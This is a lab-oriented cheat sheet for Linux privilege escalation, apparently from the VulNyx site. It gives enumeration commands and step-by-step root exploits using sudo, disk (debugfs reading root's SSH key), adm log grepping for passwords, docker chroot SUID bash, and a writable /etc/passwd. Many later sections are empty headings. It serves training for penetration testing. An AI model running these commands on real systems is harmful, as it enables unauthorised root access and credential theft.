---
title: 🐧 Privilege Escalation (Linux)
date: 0003-01-01
layout: post
---

### Enumeration

```bash
# sudo
sudo -l
# If when performing the previous step it tells you that sudo is not found
find / -name sudo 2>/dev/null

# suid
find / -perm -4000 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -exec ls -l {} \; 2>/dev/null

# capabilities
/usr/sbin/getcap -r / 2>/dev/null

# users
grep "sh$" /etc/passwd

# writable
find / -writable 2>/dev/null
find / -writable 2>/dev/null | grep -viE "proc|sys|dev"
find / -writable -user low 2>/dev/null
```

If I identify a **binary** with `suid` or `sudo` **permissions** [**GTFOBins**](https://gtfobins.github.io) is the way.

### Cron (Task)

View `cron` jobs defined in **global file**:

```bash
cat /etc/crontab
```

If tasks have been defined in the individual file that each user has with `crontab -e`, it is necessary to monitor with specific tools.

#### pspy

Use [**pspy**](https://github.com/DominicBreuker/pspy) tool to **monitor tasks**.

```ruby
low@vulnyx:~$ cd /dev/shm
low@vulnyx:/dev/shm$ wget -q --no-check-certificate "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
low@vulnyx:/dev/shm$ chmod +x pspy64
low@vulnyx:/dev/shm$ ./pspy64
```

#### Bash

You can also use `bash` and do it manually.

```bash
#!/bin/bash

old=$(ps -eo command)
filter="kworker|command|defunct"

function ctrl_c(){
  exit 1
}

trap ctrl_c int

while true; do
  new=$(ps -eo command)
  diff <(echo "$old") <(echo "$new") | grep "[\>\<]" | grep -vE "$filter"
  old=$new
done
```

### Groups

#### sudo

When a user is part of the `sudo` **group**, he can run any command as the `root` user.

```ruby
# Check Group
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),27(sudo)

# Abuse Group
low@vulnyx:~$ sudo su
root@vulnyx:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### disk

When a user is part of a `disk` **group**, he or she is granted direct access to the system **disks** and **partitions**.

```ruby
# Check Group
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),6(disk)

# Abuse Group
low@vulnyx:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            480M     0  480M   0% /dev
tmpfs            99M  3.2M   96M   4% /run
/dev/sda1        11G  2.2G  8.1G  21% /
tmpfs           494M     0  494M   0% /dev/shm

low@vulnyx:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.44.5 (15-Dec-2018)
debugfs:  ls /root
debugfs:  ls /root/.ssh/
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAstkGmc1W+epM0w13VQrLO/wMNWwxFltotpa9elYJVXSlBc+PgF6I
```

#### adm

When a user is part of the `adm` **group**, he can **read log files** on the system.

```ruby
# Check Group
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),4(adm)

# Abuse Group
low@vulnyx:~$ grep --color -Eri "pass|password|secret|db" /var/log 2>/dev/null
```

#### docker

When a user is part of the `docker` **group**, they have the ability to **manage containers**.

```ruby
# Check Group
low@vulnyx:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),109(docker)

# Abuse Group
low@vulnyx:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# chmod 4755 /bin/bash
# exit
low@vulnyx:~$ /bin/bash -pi
```

#### lxd

#### fail2ban

#### video

---

### Doas

---

### pkexec <=0.105-31 (CVE-2021-4034)

---

### sudo <=1.8.27 (CVE-2019-14287)

---

### chkrootkit

---

### DirtyCOW

---

### Path Hijacking (Path Variable)

**Binary**

**Cron**

---

### Python Library Hijacking

---

### Wilcard

### /etc/passwd (Writable)

If a low-privileged user has **write permissions** to the `/etc/passwd` file, an attacker can remove the `x` (on the **root** user line) and add a **hash**, this will cause the file that validates credentials to change from `/etc/shadow` to `/etc/passwd`.

```bash
# Check Permissions
low@vulnyx:~$ ls -l /etc/passwd
-rw----rw- 1 root root 1395 abr 21 20:16 /etc/passwd

# Create Hash
root@kali:~# openssl passwd -1 "P@ssword123"
$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0

# Add Hash
# before
low@vulnyx:~$ cat /etc/passwd |grep root
root:x:0:0:root:/root:/bin/bash
# after
low@vulnyx:~$ cat /etc/passwd |grep root
root:$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0:0:0:root:/root:/bin/bash

# Authenticate
low@vulnyx:~$ su -
Password:
root@vulnyx:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

<div style="display: flex; justify-content: center; align-items: center; width: 100%; margin-top: 20px;">
  <img src="/assets/gitbook/images/favicon.png" style="width: 30px; height: auto; margin-right: 6px;">
  <span>© VulNyx 2023-2025</span>
</div>
